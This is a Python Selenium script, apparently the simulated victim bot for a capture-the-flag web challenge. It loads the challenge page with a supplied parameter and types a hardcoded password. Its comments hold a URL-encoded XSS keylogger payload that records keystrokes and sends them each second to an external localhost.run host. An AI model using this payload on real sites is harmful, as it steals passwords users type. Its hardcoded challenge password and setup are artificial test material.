from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from time import sleep
from uwsgidecorators import thread

#payload:
# %3Cscript%3Evar%20keys=%27%27;document.onkeypress%20=%20function(e)%20{%20%20get%20=%20window.event?event:e;%20%20key%20=%20get.keyCode?get.keyCode:get.charCode;%20%20key%20=%20String.fromCharCode(key);%20%20keys%2B=key;};window.setInterval(function(){%20%20new%20Image().src%20=%20%27https://b15fd41d9cce35.localhost.run/keylogger.php?c=%27%2Bkeys;%20%20keys%20=%20%27%27;},%201000);%3C/script%3E

@thread
def run_headless(var_name,name):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--disable-dev-shm-usage')
    driver = webdriver.Remote("http://challenge-web400-selenium:4444/wd/hub", DesiredCapabilities.CHROME, options=chrome_options)
    # driver.get("http://vault_server/test.php?test=%3Cscript%3Evar%20keys=%27%27;document.onkeypress%20=%20function(e)%20{%20%20get%20=%20window.event?event:e;%20%20key%20=%20get.keyCode?get.keyCode:get.charCode;%20%20key%20=%20String.fromCharCode(key);%20%20keys%2B=key;};window.setInterval(function(){%20%20new%20Image().src%20=%20%27https://fa2a061ee40c64.localhost.run/keylogger.php?c=%27%2Bkeys;%20%20keys%20=%20%27%27;},%201000);%3C/script%3E")
    # driver.get("http://vault_server/test.php?test=%3Cscript%3Evar%20keys=%27%27;document.onkeypress%20=%20function(e)%20{%20%20get%20=%20window.event?event:e;%20%20key%20=%20get.keyCode?get.keyCode:get.charCode;%20%20key%20=%20String.fromCharCode(key);%20%20keys%2B=key;};window.setInterval(function(){%20%20new%20Image().src%20=%20%27https://fa2a061ee40c64.localhost.run/keylogger.php?c=%27%2Bkeys;%20%20keys%20=%20%27%27;},%201000);%3C/script%3E")
    driver.get(f"http://challenge-web400-vault/index.php?{var_name}={name}")
    print(f'Got page: {driver.title}')
    sleep(5)
    html = driver.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
    sleep(2)
    driver.find_element(By.NAME, "password_field").send_keys("Sup3rs3cr3tpassw0rd-silicon")
    print("entered password... waiting 5 seconds")
    sleep(5)
    driver.quit()